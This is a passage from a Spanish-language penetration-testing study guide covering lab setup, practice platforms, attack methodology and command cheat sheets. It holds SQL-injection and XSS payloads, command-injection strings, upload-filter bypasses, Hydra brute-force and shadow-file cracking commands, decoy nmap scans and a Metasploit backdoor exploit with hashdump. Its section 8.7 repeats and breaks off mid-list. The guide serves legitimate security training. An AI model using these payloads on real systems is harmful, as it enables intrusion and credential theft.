- Usuario: msfadmin, Password: msfadmin
- Servicios vulnerables: FTP (vsftpd 2.3.4), SSH, Telnet, Samba, Apache, MySQL, Tomcat, etc.
- Ideal para: escaneo, enumeracion, explotacion

**DVWA (Damn Vulnerable Web Application):**
- Opcion 1: Instalar en Linux VM (PHP + MySQL)
- Opcion 2: [docker](../raw/d0ck3r-f0r-h4ck3rs.md) ([docker](../raw/d0ck3r-f0r-h4ck3rs.md) pull vulnerables/web-dvwa)
- Acceder: [http](../raw/r3d3s-f0nd4m3nt0s.md#http)://localhost/dvwa
- Usuario: admin, Password: password
- Niveles: Low (sin proteccion), Medium, High, Impossible
- Ejercicios: [sqli](../raw/w3b-h4ck1ng.md#sql-injection), [xss](../raw/w3b-h4ck1ng.md#xss), [csrf](../raw/w3b-h4ck1ng.md#csrf), [file upload](../raw/w3b-h4ck1ng.md#file-upload), Command Execution, etc.

**VulnHub Boxes:**
- Descargar .ova o .vmdk de vulnhub.com
- Importar en VirtualBox
- Cada maquina tiene su propio objetivo (generalmente obtener root)
- Clasicas: Kioptrix, Mr-Robot (inspirada en la serie), DC Series, FristiLeaks

### 8.2 Networking for Lab

Configurar la red correctamente es crucial para que las VMs se comuniquen entre si pero no interfieran con tu red real.

**NAT (Network Address Translation):**
- La VM comparte la [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) del host
- Puede salir a internet
- Las VMs NO pueden verse entre si (por defecto)
- Las VMs no son accesibles desde el host (por IP)
- Uso: para que Kali tenga internet (actualizaciones, descargas)

**Host-only:**
- Red privada entre host y VMs
- NO hay acceso a internet
- Las VMs pueden comunicarse entre si y con el host
- Uso: red de laboratorio aislada
- Tipica IP: 192.168.56.x (VirtualBox)

**Bridged (Puente):**
- La VM aparece como un dispositivo mas en tu red fisica
- Obtiene IP del [router](../raw/r3d3s-f0nd4m3nt0s.md#routers) de tu casa/oficina
- Puede acceder a internet y a otros dispositivos de la red
- Uso: cuando necesitas que la VM sea accesible desde tu red
- Riesgo: la VM vulnerable esta en tu red real
- Configuracion tipica para laboratorio: NO USAR a menos que sepas lo que haces

**Internal Network:**
- Red aislada SOLO entre VMs
- El host NO puede acceder a esta red
- Las VMs no tienen internet
- Uso: crear una red completamente aislada

**Configuracion recomendada para laboratorio:**
1. Kali: 2 adaptadores de red
   - Adaptador 1: NAT (para internet)
   - Adaptador 2: Host-only (para comunicarse con VMs vulnerables)
2. VMs vulnerables: 1 adaptador Host-only
3. Todas las VMs en la misma red Host-only se ven entre si
4. Kali tiene internet por NAT, las VMs vulnerables no

### 8.3 Docker para Seguridad

Docker es excelente para levantar entornos vulnerables rapidamente.

**Entornos vulnerables en Docker:**

`ash
# DVWA
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# WebGoat (OWASP)
docker run --rm -it -p 8080:8080 webgoat/goatandwolf

# Juice Shop (OWASP)
docker run --rm -it -p 3000:3000 bkimminich/juice-shop

# Metasploitable (version container)
docker run --rm -it -p 21:21 -p 22:22 -p 80:80 tleemcjr/metasploitable2

# Vulhub (coleccion de entornos vulnerables)
git clone [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.com/vulhub/vulhub.git
cd vulhub/ghostscript/[cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2023-36664
docker-compose up -d
`

**Contenedores para herramientas:**

`ash
# Kali en Docker
docker run --rm -it kalilinux/kali-rolling

# Burp Suite Community
docker run --rm -it -p 8080:8080 burpsuite/burpsuite

# SQLMap
docker run --rm -it pauloschilling/[sqlmap](../raw/w3b-h4ck1ng.md#sqlmap)
`

**Ventajas de Docker:**
- Arranque instantaneo (segundos)
- Menos recursos que VMs
- Facil de destruir y recrear (docker-compose down)
- Aislado (comparte [kernel](../raw/0s-f0nd4m3nt0s.md#kernel), pero con namespaces)
- Reproducible (Dockerfile)

**Limitaciones:**
- Solo Linux (en Windows/Mac corre en VM)
- No para exploits de kernel (comparten kernel con host)
- No para pruebas de red complejas

### 8.4 Practice Platforms

Plataformas online para practicar hacking legal.

**Hack The Box ([htb](../raw/ctf-h4ckth3b0x.md#hackthebox)):**

**Modelo:**
- [vpn](../raw/4n0n1m4t0.md#vpn) connection (OpenVPN) a la infraestructura de HTB
- Maquinas (boxes) para hackear
- Retos (challenges): web, pwn, [forense](../raw/w1n-f0r3ns1cs.md#forense), reversing, crypto, mobile
- Fortress: maquinas multi-nivel
- Pro Labs: entornos corporativos simulados

**Free vs VIP:**
- Free: acceso a maquinas activas (sin writeups), 1 maquina a la vez, 8h de reset
- VIP (/mes): maquinas retiradas (con writeups), 3 maquinas a la vez, PwnBox (entorno [cloud](../raw/cl0ud-h4ck1ng.md) para atacar)
- VIP+ (/mes): 5 maquinas a la vez, acceso a Pro Labs

**Como empezar en HTB:**
1. Crear cuenta en [hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)-h4ckth3b0x.md#[hackthebox](../raw/ctf-h4ckth3b0x.md#hackthebox)).com
2. Descargar .ovpn de "Starting Point"
3. Conectarse: [sudo](../raw/l1n9x-pr1v3sc.md#sudo) openvpn starting_point.ovpn
4. Ping a 10.129.1.1 para verificar conexion
5. Elegir maquina, escanear, enumerar, explotar
6. Obtener user.txt (user flag) y root.txt (root flag)
7. Reportar en la plataforma para obtener puntos

**[tryhackme](../raw/ctf-h4ckth3b0x.md#tryhackme) (THM):**

**Modelo:**
- Browser-based VPN (no requiere instalacion de OpenVPN)
- Rooms: laboratorios guiados paso a paso
- Paths: rutas de aprendizaje estructuradas

**Free vs Premium:**
- Free: acceso a rooms gratuitos, AttackBox limitada
- Premium (/mes): todos los rooms, AttackBox completa, maquinas ilimitadas

**Paths recomendados:**
- Jr Penetration Tester: ruta completa de pentesting
- Offensive Pentesting: nivel intermedio-avanzado
- Complete Beginner: para arrancar de cero
- Web Fundamentals: hacking web basico

**Como empezar en THM:**
1. Crear cuenta en tryhackme.com
2. Hacer "OpenVPN" o usar AttackBox (en browser)
3. Buscar rooms por tema (ej: "[nmap](../raw/nm4p.md)", "[sql injection](../raw/w3b-h4ck1ng.md#sql-injection)")
4. Seguir las instrucciones paso a paso
5. [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) preguntas y obtener insignias

**VulnHub:**
- Gratuito, sin login
- Descargar VMs y correrlas localmente
- Cada maquina tiene un README con pistas
- Writeups en Medium/YouTube
- No hay scoring ni gamification

**PentesterLab:**
- Enfocado en web y aplicaciones
- Ejercicios progresivos
- PRO (/mes): ejercicios completos

**PortSwigger Web Security Academy:**
- Gratuito
- Todos los topics de seguridad web
- Labs interactivos integrados en el [navegador](../raw/br0ws3r-3xpl01t4t10n.md)
- Acompaña el [burp suite](../raw/w3b-h4ck1ng.md#burp-suite) Certified Practitioner
- Muy recomendado para aprender hacking web

### 8.5 How to Approach a New Box/Maquina

Metodologia para atacar una nueva maquina (HTB, VulnHub, etc.).

**Fase 1: [reconocimiento](../raw/0s1nt.md#reconocimiento) (70% del tiempo)**
`ash
# 1. Ping para ver si responde
ping -c 4 10.10.10.10

# 2. Escaneo de puertos (rapido primero, luego completo)
nmap -sS -p- --min-rate=5000 10.10.10.10 -oN scan-all
nmap -sV -sC -p22,80,443 10.10.10.10 -oA scan-details

# 3. Enumeracion de servicios encontrados
# Puerto 80: gobuster, nikto, whatweb, curl
# Puerto 445: enum4linux, smbclient, smbmap
# Puerto 22: enumerar version SSH, usuarios
# Puerto 3306: mysql (si es accesible externamente)
`

**Fase 2: Enumeracion Profunda**
- Buscar vulnerabilidades asociadas a las versiones encontradas
- Google search, searchsploit, CVE databases
- Si es web: revisar cada endpoint, parametro, funcionalidad
- Probar usuarios por defecto, credenciales debiles
- Revisar codigo fuente de paginas web
- Probar [lfi](../raw/w3b-h4ck1ng.md#lfi)/[rfi](../raw/w3b-h4ck1ng.md#rfi), Path Traversal, SSTI, etc.

**Fase 3: Explotacion**
- Buscar [exploit](../raw/m3t4spl01t.md#exploits) publico (si existe) y adaptarlo
- Si no hay exploit publico: analisis manual de la [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades)
- Probar [fuerza bruta](../raw/p4ssw0rd-4tt4cks.md#fuerza-bruta) de servicios ([hydra](../raw/p4ssw0rd-4tt4cks.md#hydra), medusa)
- Probar inyecciones (SQLi, NoSQLi, [command injection](../raw/w3b-h4ck1ng.md#command-injection))
- Probar [subida de archivos](../raw/w3b-h4ck1ng.md#file-upload) (webshell)
- Probar [ssrf](../raw/w3b-h4ck1ng.md#ssrf), deserializacion, etc.

**Fase 4: Post-Explotacion**
- Una vez con acceso: enumerar el sistema
- Buscar archivos de configuracion con credenciales
- Ver que usuarios existen
- Ver que corre en el sistema (ps aux)
- Buscar archivos [suid](../raw/l1n9x-pr1v3sc.md#suid), [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities), [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs) jobs
- Escalar privilegios
- Movimiento lateral (si hay mas maquinas)

**Fase 5: Documentacion**
- Tomar notas de cada paso
- Guardar comandos usados
- Guardar exploits y modificaciones
- Escribir un writeup (te ayuda a aprender)

**Pwn Mindset (Mentalidad de Hacker):**

- **Enumeration es clave:** el 70% del tiempo debe ser enumeracion. Si no encontas nada, estas enumerando mal
- **No te rindas rapido:** proba diferentes enfoques, diferentes puertos, diferentes servicios
- **Lee el output:** nmap, [gobuster](../raw/w3b-h4ck1ng.md#gobuster), curl, etc. Leer bien los resultados da pistas
- **Google es tu amigo:** busca versiones de servicios, CVEs, writeups de maquinas similares
- **Pensa como el creador:** que vulnerabilidad intencional puso? por que este servicio?
- **Tomatelo con calma:** algunas maquinas toman dias. No pasa nada
- **Aprende del writeup:** si no pudiste, lee el writeup, entende que no viste, y la proxima lo tenes
- **Practica consistente:** mejor 1 hora por dia que 7 horas un solo dia
- **Respeta las reglas:** no ataques fuera del scope, no hagas DoS, no compartas flags
- **Comparti conocimiento:** escribi writeups, ayuda a otros, la comunidad se fortalece

### 8.6 Recursos Adicionales

**Libros:**
- "The Web Application Hacker's Handbook" (Stuttard & Pinto)
- "Penetration Testing: A Hands-On Introduction to Hacking" (Georgia Weidman)
- "The Hacker Playbook 3" (Peter Kim)
- "[red team](../raw/r3d-t34m-1nfr4.md) Field Manual" (Ben Clark)
- "[windows internals](../raw/w1n-1nt3rn4ls.md)" (Russinovich)
- "Practical Malware Analysis" (Sikorski & Honig)

**Canales de YouTube:**
- IppSec: writeups de HTB (el mejor)
- 0xdf: writeups detallados
- [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper) Hammond: CTFs y Writeups
- NetworkChuck: introduccion a hacking
- CyberMentor: tutoriales y carreras
- The Cyber Mentor (TCM): cursos practicos
- STOK: hacking y [bug bounty](../raw/b9g-b09nty.md)
- InsiderPhD: bug bounty y web

**Blogs:**
- 0xdf.gitlab.io
- ippsec.rocks (busqueda de tecnicas)
- pentesterlab.com/blog
- portswigger.net/research
- googleprojectzero.blogspot.com
- blog.skullsecurity.org
- sensepost.com/blog

**Comunidades:**
- Reddit: r/netsec, r/AskNetsec, r/hacking, r/HowToHack
- Discord: servidores de HTB, THM, comunidades locales
- CTFtime: calendario de CTFs
- Twitter/X: seguir a investigadores de seguridad

**Laboratorios Recomendados (orden sugerido):**
1. PortSwigger Web Security Academy (gratis, browser-based)
2. TryHackMe: Complete Beginner Path (guiado)
3. TryHackMe: Jr Penetration Tester Path (guiado)
4. VulnHub: Kioptrix Level 1 (facil, local)
5. Hack The Box: Starting Point (facil, online)
6. VulnHub: Mr-Robot (medio)
7. Hack The Box: Jerry, Lame, [legacy](../raw/l3g4cy-3nt3rpr1s3.md) (faciles)
8. PortSwigger: Burp Suite Certified Practitioner (intermedio)
9. Hack The Box: Busqueda, Blunder, Paper (medios)
10. Pro Labs: HTB Dante (entorno corporativo)

**Recomendacion final:** No te apresures. La [seguridad informatica](../raw/s3c-f0nd4m3nt0s.md) es un campo ENORME. Nadie sabe todo. Elegi un area que te guste (web, [redes](../raw/r3d3s-f0nd4m3nt0s.md), reversing, forense, etc.) y profundiza. Lo que aprendes aca son los fundamentos que aplican a todas las areas. Practica, practica, practica.

---

> *"The only way to be safe is to never be secure, and the only way to be secure is to understand what being insecure means."* - Desconocido

> *"Hacking is not about breaking things. It's about understanding how things work at a level deep enough to see both their potential and their limitations."*

---

*Documento creado como base fundamental para los tutoriales de hacking. Actualizado: Mayo 2026.*

### 8.7 Vulnerabilidades Web - Labs Practicos

**SQL Injection Lab:**

Escenario basico de SQLi en login:
`sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' UNION SELECT null,null,null --
`

Practicar con:
- DVWA SQL Injection (Low/Medium/High)
- PortSwigger SQLi Labs
- TryHackMe: SQL Injection room

**XSS (cross-site [scripting](../raw/w3b-h4ck1ng.md#xss)) Lab:**

Tipos de XSS:
- Reflected: el [payload](../raw/m3t4spl01t.md#payloads) va en la URL/respuesta inmediata
- Stored: el payload se guarda en el servidor (mas peligroso)
- DOM-based: el payload modifica el DOM del lado del cliente

Payloads basicos:
`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
`

Practicar con:
- DVWA XSS (Reflected/Stored/DOM)
- PortSwigger XSS Labs
- TryHackMe: XSS room

**Command Injection Lab:**

`ash
; id
| id
|| id
id

| whoami
; ls -la
`

Practicar con:
- DVWA Command Injection
- PortSwigger OS Command Injection Labs

**File Upload Lab:**

Tecnicas de bypass:
- Cambiar extension: shell.php5, shell.phtml, shell.php.jpg
- Cambiar Content-Type: image/jpeg
- Doble extension: shell.php.jpg
- Null byte: shell.php%00.jpg (PHP viejo)
- Magic bytes: agregar GIF89a al inicio

Practicar con:
- DVWA File Upload
- TryHackMe: Upload Vulnerabilities

### 8.8 [escaneo de puertos](../raw/nm4p.md#escaneo-de-puertos) - Practica

**nmap por niveles:**

Nivel 1 - Descubrimiento de hosts:
`ash
nmap -sn 192.168.1.0/24
nmap -sn 10.10.10.0/24
`

Nivel 2 - Escaneo rapido de puertos comunes:
`ash
nmap -sS -T4 --top-ports 1000 10.10.10.10
`

Nivel 3 - Escaneo completo:
`ash
nmap -sS -p- --min-rate=5000 10.10.10.10
`

Nivel 4 - Deteccion de versiones y scripts:
`ash
nmap -sV -sC -p22,80,443 10.10.10.10
`

Nivel 5 - Escaneo sigiloso (evasion):
`ash
nmap -sS -D RND:10 --source-port 53 -f 10.10.10.10
`

**masscan (rapidisimo):**
`ash
masscan 10.10.10.0/24 -p1-65535 --rate=10000
masscan 10.10.10.10 -p80,443,22,21,3306,8080 --rate=1000
`

### 8.9 Fuerza Bruta - Practica

**Hydra - fuerza bruta online:**
`ash
# SSH
hydra -l admin -P rockyou.txt ssh://10.10.10.10

# HTTP POST form
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# FTP
hydra -l ftpuser -P rockyou.txt ftp://10.10.10.10

# RDP
hydra -l administrator -P rockyou.txt rdp://10.10.10.10

# SMB
hydra -l administrator -P rockyou.txt [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb)://10.10.10.10
`

**[john the ripper](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper) - [cracking](../raw/p4ssw0rd-4tt4cks.md#cracking-de-contrasenas) offline:**
`ash
# Unshadow (Linux)
unshadow /etc/passwd /etc/shadow > hashes.txt
john hashes.txt --wordlist=rockyou.txt

# ZIP
zip2zip encrypted.zip > [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions).txt
john hash.txt --wordlist=rockyou.txt

# RAR
rar2john encrypted.rar > hash.txt
john hash.txt --wordlist=rockyou.txt
`

### 8.10 Enumeracion SMB - Practica

`ash
# Enumerar con enum4linux
[enum4linux](../raw/w1nd0ws-p0st3xpl01t.md#enum4linux) -a 10.10.10.10

# Listar shares con smbclient
smbclient -L //10.10.10.10 -N

# Conectarse a un share
smbclient //10.10.10.10/share -N

# Enumerar con smbmap
smbmap -H 10.10.10.10

# CrackMapExec (moderno)
crackmapexec smb 10.10.10.10 -u '' -p ''
crackmapexec smb 10.10.10.10 -u admin -p password123 --shares
`

### 8.11 Enumeracion Web - Practica

`ash
# Gobuster - directorios
gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Gobuster - subdominios (DNS)
gobuster [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) -d ejemplo.com -w /usr/share/wordlists/amass/subdomains-top1mil.txt

# WFuzz - parametros
wfuzz -c -z file,/usr/share/wordlists/common.txt --hc 404 http://10.10.10.10/FUZZ

# Nikto - scanner web
[nikto](../raw/w3b-h4ck1ng.md#nikto) -h http://10.10.10.10

# WhatWeb - identificar tecnologias
whatweb http://10.10.10.10 -v

# Curl - exploracion manual
curl -v http://10.10.10.10
curl -X POST -d "user=admin&pass=admin" http://10.10.10.10/login
curl -H "X-Forwarded-For: 127.0.0.1" http://10.10.10.10/admin
`

### 8.12 [escalada de privilegios](../raw/l1n9x-pr1v3sc.md) Linux - Checklist

**Enumeration commands:**
`ash
# Info del sistema
uname -a
cat /etc/os-release
cat /proc/version

# Usuarios
id
cat /etc/passwd
cat /etc/shadow
whoami

# SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Sudo
sudo -l

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/

# Procesos
ps aux
ps -ef

# Red
netstat -tulanp
ss -tulanp

# Archivos interesantes
find / -writable -type f 2>/dev/null
find / -name "*.key" -o -name "*.pem" 2>/dev/null
find / -name "config*" -o -name "*.conf" 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# NFS
cat /etc/exports
showmount -e localhost
`

**Herramientas automaticas:**
- [linpeas](../raw/l1n9x-pr1v3sc.md#linpeas): https://github.com/carlospolop/PEASS-ng
- LinEnum: github.com/rebootuser/LinEnum
- Linux Exploit Suggester: github.com/mzet-/linux-exploit-suggester
- GTFOBins: busca binarios SUID con funciones utiles

### 8.13 Escalada de Privilegios Windows - Checklist

**Enumeration commands:**
`powershell
# Info del sistema
systeminfo
wmic os get Caption,Version
Get-ComputerInfo

# Usuarios y grupos
whoami
whoami /all
net users
net localgroup administrators

# Parches de seguridad
wmic qfe get Caption,Description,HotFixID,InstalledOn

# Procesos
tasklist /svc
Get-Process

# Servicios
wmic service get Name,DisplayName,PathName,StartName
Get-Service

# Archivos interesantes
findstr /si password *.txt *.ini *.config
Get-ChildItem -Recurse -Filter *.config -ErrorAction SilentlyContinue

# Network
netstat -ano
Get-NetTCPConnection
`

**Herramientas automaticas:**
- [winpeas](../raw/l1n9x-pr1v3sc.md#winpeas): github.com/carlospolop/PEASS-ng
- PowerUp: github.com/PowerShellMafia/PowerSploit
- Seatbelt: github.com/GhostPack/Seatbelt
- JAWS: github.com/411Hall/JAWS
- Sherlock: github.com/rasta-mouse/Sherlock

### 8.14 Practica de [osint](../raw/0s1nt.md)

Ejercicios para practicar OSINT:

**Ejercicio 1 - Investigar una empresa:**
1. Encontrar el dominio principal
2. Buscar subdominios con crt.sh y dnsdumpster
3. Buscar empleados en LinkedIn
4. Encontrar patron de emails con hunter.io
5. Buscar filtraciones en haveibeenpwned
6. Buscar tecnologias con whatweb
7. Google [dorking](../raw/0s1nt.md#google-dorks): site:dominio filetype:pdf

**Ejercicio 2 - Investigar una persona:**
1. Buscar en redes sociales (username igual en todas)
2. Buscar en Google Imagenes
3. Buscar en repositorios de codigo (GitHub, GitLab)
4. Buscar en foros y comunidades
5. Buscar en registros publicos
6. Buscar en Wayback Machine (archive.org) su actividad pasada
7. Buscar filtraciones de emails

**Ejercicio 3 - Investigar una IP:**
1. WHOIS de la IP
2. [shodan](../raw/0s1nt.md#shodan): [shodan](../raw/0s1nt.md#shodan).io
3. Censys: censys.io
4. Reverse DNS: dig -x IP
5. Ver si la IP esta en listas negras
6. Buscar cambios historicos con securitytrails.com

### 8.15 [metasploit](../raw/m3t4spl01t.md) - Practica Basica

`ash
# Iniciar metasploit
[msfconsole](../raw/m3t4spl01t.md#msfconsole)

# Buscar exploits
search vsftpd
search eternalblue
search type:exploit platform:windows

# Usar un exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# Configurar opciones
show options
[set](../raw/ph1sh1ng.md#social-engineering-toolkit) RHOSTS 10.10.10.10
set RPORT 21
set LHOST 10.10.10.5
set LPORT 4444

# Ejecutar
run
exploit
check

# Sesiones activas
sessions
sessions -i 1

# Post-explotacion con meterpreter
sysinfo
getuid
getsystem
hashdump
screenshot
shell
upload /path/to/file
download /path/to/file
background
`

### 8.16 Burp Suite - Flujo de Trabajo

**Configuracion basica:**
1. Abrir Burp Suite (Community/Professional)
2. Ir a [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) > [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) Settings
3. Configurar listener en 127.0.0.1:8080
4. Configurar proxy en el navegador (FoxyProxy)
5. Instalar certificado de Burp (para HTTPS)
   - Navegar a http://burpsuite
   - Descargar e instalar el certificado CA

**Flujo tipico:**
1. Interceptar request con el Proxy
2. Enviar a Repeater (Ctrl+R) para modificar y reenviar
3. Enviar a Intruder (Ctrl+I) para automatizar ataques
4. Usar Decoder para codificar/decodificar datos
5. Revisar target map en Target > Site Map
6. Escanear automaticamente (Burp Pro)

**Intruder - Ataques:**
- Sniper: un payload, misma posicion
- Battering ram: un payload, multiples posiciones
- Pitchfork: multiples payloads, una posicion cada uno
- [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster)) bomb: todas las combinaciones de multiples payloads

**Extensiones utiles:**
- Logger++: logging avanzado
- Autorize: pruebas de autorizacion
- Turbo Intruder: intruder rapido (Py)
- Collaborator Everywhere: deteccion de SSRF

### 8.17 [ctf](../raw/ctf-h4ckth3b0x.md) Basics

**Que es un CTF:**
[capture the flag](../raw/ctf-h4ckth3b0x.md) es una competencia de hacking donde hay que encontrar "flags" (codigos) escondidos en sistemas vulnerables.

**Tipos de CTF:**
- Jeopardy: categorias (web, crypto, forense, reversing, pwn, misc)
- Attack-Defense: atacar y defender sistemas
- Mixed: combinacion

**Categorias tipicas:**
- Web: SQLi, XSS, SSTI, LFI, SSRF, deserializacion
- Crypto: cifrados clasicos, [rsa](../raw/crypt0-f0r-h4ck3rs.md#rsa), [aes](../raw/crypt0-f0r-h4ck3rs.md#aes), hashing, esteganografia
- Forense: analisis de archivos, memoria RAM, trafico de red
- Reversing: analisis de binarios, crackmes, keygenme
- Pwn: [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow), ROP, shellcode
- Misc: OSINT, ingenio, [programacion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md), esteganografia
- OSINT: busqueda de informacion

**Herramientas para CTF:**
- CyberChef: decodificar, transformar datos
- Burp Suite: web hacking
- [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark): analisis de trafico
- [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra)/IDA: reversing
- pwntools: exploit development ([python](../raw/pyth0n-f0r-h4ck1ng.md))
- z3: constraint solver para reversing
- Steghide/stegextract: esteganografia
- John/[hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat): cracking de hashes
- Volatility: analisis de memoria

### 8.18 Como Mantenerse Actualizado

La seguridad informatica cambia TODO EL TIEMPO. Nuevas vulnerabilidades, nuevas herramientas, nuevas tecnicas.

**Fuentes de informacion:**

**Noticias de seguridad:**
- The Hacker News (thehackernews.com)
- Bleeping Computer (bleepingcomputer.com)
- Krebs on Security (krebsonsecurity.com)
- Dark Reading (darkreading.com)
- SecurityWeek (securityweek.com)

**Vulnerabilidades:**
- CVE Mitre (cve.mitre.org)
- NVD (nvd.[nist](../raw/p3nt3st-m3th0d0l0gy.md#nist).gov)
- Exploit-DB (exploit-db.com)
- Packet Storm (packetstormsecurity.com)
- GitHub Advisory Database

**Redes Sociales:**
- Twitter/X: seguir a @MalwareTechBlog, @troyhunt, @binitamshah, @SwiftOnSecurity, @mikko
- Reddit: r/netsec, r/AskNetsec, r/blueteamsec
- LinkedIn: seguir empresas de seguridad y CISO
- YouTube: IppSec, John Hammond, LiveOverflow, 0x41414141

**Podcasts:**
- Security Now (TWIT)
- Risky Business
- Darknet Diaries (historias reales, muy recomendado)
- CyberWire Daily
- The Hacker Mind

**Conferencias (asistir o ver videos):**
- DEF CON (Las Vegas, la mas famosa)
- Black Hat (USA, Europe, Asia)
- BSides (eventos locales en todo el mundo)
- Ekoparty (Argentina, la mas importante de Latinoamerica)
- 33CON (India)
- HITB (Hack In The Box, Asia/Europa)
- CCC (Chaos Communication Congress, Alemania)

### 8.19 Errores Comunes de Principiantes

**1. No enumerar lo suficiente:**
Pasan directo a explotar sin haber enumerado bien. Tiran un exploit random que no funciona y se rinden. La enumeracion es el 70% del trabajo.

**2. No entender la vulnerabilidad:**
Usan un exploit sin entender que hace. Cuando no funciona, no saben como arreglarlo. Entende la vulnerabilidad, no solo copies comandos.

**3. Saltarse pasos:**
Se saltean el escaneo completo. \"Solo voy a mirar el [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) 80\". Se pierden servicios en otros puertos. Escanea TODO.

**4. No tomar notas:**
No documentan lo que hacen. Despues no recuerdan que comandos usaron, que encontraron, que no funciono. Tomar notas es esencial.

**5. No entender la red del laboratorio:**
Configuran mal las redes de las VMs y no se ven entre si. O peor, ponen la VM vulnerable en modo bridge en su red de casa.

**6. Probar exploits maliciosos sin entenderlos:**
Bajan un exploit de GitHub, lo ejecutan, y termina siendo un ransomware. Siempre revisa el codigo antes de ejecutar.

**7. Depender demasiado de herramientas automaticas:**
Usan solo nmap automatico y metasploit sin entender que hacen. Las herramientas fallan, y ahi es donde importa saber lo basico.

**8. No leer la documentacion:**
No leen man pages, READMEs, ni tutorials. Despues preguntan cosas basicas que estan en la documentacion.

**9. Querer correr antes de caminar:**
Quieren hacer hacking de redes sin saber [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip). O reversing sin saber [assembly](../raw/4ss3mbly-f0r-h4ck3rs.md). O explotacion sin saber C. Aprendan los fundamentos primero.

**10. No practicar consistentemente:**
Hacen una semana intensa y despues no tocan nada por meses. Mejor practicar 30 minutos todos los dias que 8 horas un solo sabado.

### 8.20 Proximos Pasos

Una vez que domines los fundamentos de este documento:

**Para especializarte en Web:**
- Profundizar en [owasp top 10](../raw/w3b-h4ck1ng.md#owasp-top-10)
- PortSwigger Web Security Academy (gratis)
- Burp Suite Certified Practitioner
- Estudiar JS, PHP, SQL, APIs REST

**Para especializarte en Redes:**
- CCNA Security o equivalente
- Protocolos: [tcp/ip](../raw/r3d3s-f0nd4m3nt0s.md#tcp-ip), DNS, [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp), [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp), [bGP](../raw/r3d3s-4v4nz4d4s.md#bgp), [ospf](../raw/r3d3s-4v4nz4d4s.md#ospf)
- Herramientas: Wireshark, Scapy, Nmap avanzado
- Segmentacion, firewalls, [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))/[ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips)

**Para especializarte en [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md):**
- Estudiar como funciona [ad](../raw/w1nd0ws-d0m41n-4dm1n.md)
- Herramientas: [bloodhound](../raw/w1nd0ws-p0st3xpl01t.md#bloodhound), [mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz), Impacket
- Ataques: [kerberoasting](../raw/w1nd0ws-d0m41n-4dm1n.md#kerberoasting), [as-rep roasting](../raw/w1nd0ws-d0m41n-4dm1n.md#as-rep-roasting), [dcsync](../raw/w1nd0ws-d0m41n-4dm1n.md#dcsync)
- Certificaciones: CRTP (certified offensive security)

**Para especializarte en Exploit Development:**
- Assembly ([x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86)/[x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64))
- Buffer overflow, ROP, Heap exploitation
- [fuzzing](../raw/fuzz1ng.md)
- Windows internals
- Herramientas: Ghidra, WinDbg, GDB, pwntools

**Para especializarte en Forense:**
- Analisis de memoria (Volatility)
- Analisis de disco (Sleuth Kit, Autopsy)
- Analisis de red (Wireshark, NetworkMiner)
- Recovering de archivos
- Malware analysis basico

**Para especializarte en Bug Bounty:**
- PortSwigger Web Security Academy
- Practicar en plataformas ([hackerone](../raw/b9g-b09nty.md#hackerone), [bugcrowd](../raw/b9g-b09nty.md#bugcrowd))
- Leer reportes publicos (Hacktivity)
- Especializarse en una categoria (XSS, SSRF, IDOR)
- Hacer programas privados primero

---

*Documento completo. Recorda: la seguridad es un viaje, no un destino. Nunca dejes de aprender.*

### 8.7 Vulnerabilidades Web - Labs Practicos

**SQL Injection Lab:**

Escenario basico de SQLi en login:
`sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' UNION SELECT null,null,null --
`

Practicar con:
- DVWA SQL Injection (Low/Medium/High)
- PortSwigger SQLi Labs
- TryHackMe: SQL Injection room

**XSS ([cross-site scripting](../raw/w3b-h4ck1ng.md#xss)) Lab:**

Tipos de XSS:
- Reflected: el payload va en la URL/respuesta inmediata
- Stored: el payload se guarda en el servidor (mas peligroso)
- DOM-based: el payload modifica el DOM del lado del cliente

Payloads basicos:
`html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
`

Practicar con:
- DVWA XSS (Reflected/Stored/DOM)
- PortSwigger XSS Labs
- TryHackMe: XSS room

**Command Injection Lab:**

`ash
; id
| id
|| id
id
